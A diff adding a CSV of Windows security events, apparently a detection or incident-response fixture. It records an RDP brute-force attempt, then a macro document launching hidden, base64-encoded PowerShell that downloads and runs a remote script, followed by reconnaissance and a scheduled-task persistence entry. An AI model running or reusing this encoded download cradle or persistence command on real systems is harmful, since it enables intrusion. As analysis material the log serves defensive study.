@@ -1,0 +1,15 @@
+TimeCreated,EventID,Computer,Account,Details
+2026-10-27T04:00:10Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:01:11Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:02:12Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:03:13Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:04:14Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:05:15Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:06:16Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:07:17Z,4625,WS-014,Administrator,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006D
+2026-10-27T04:09:30Z,4625,WS-014,jsmith,LogonType=10 SourceIP=192.0.2.88 Status=0xC000006A
+2026-10-27T07:55:01Z,4624,WS-014,jsmith,LogonType=2 SourceIP=-
+2026-10-27T08:41:17Z,4688,WS-014,jsmith,"NewProcess=WINWORD.EXE Parent=explorer.exe CmdLine=WINWORD.EXE ""Invoice_Q3.docm"""
+2026-10-27T08:41:29Z,4688,WS-014,jsmith,NewProcess=powershell.exe Parent=WINWORD.EXE CmdLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGEALgBwAHMAMQAnACkA
+2026-10-27T08:41:35Z,4688,WS-014,jsmith,NewProcess=whoami.exe Parent=powershell.exe CmdLine=whoami /all
+2026-10-27T08:42:10Z,4698,WS-014,jsmith,ScheduledTask=\Updater Action=powershell.exe -w hidden -File C:\Users\jsmith\AppData\Roaming\u.ps1
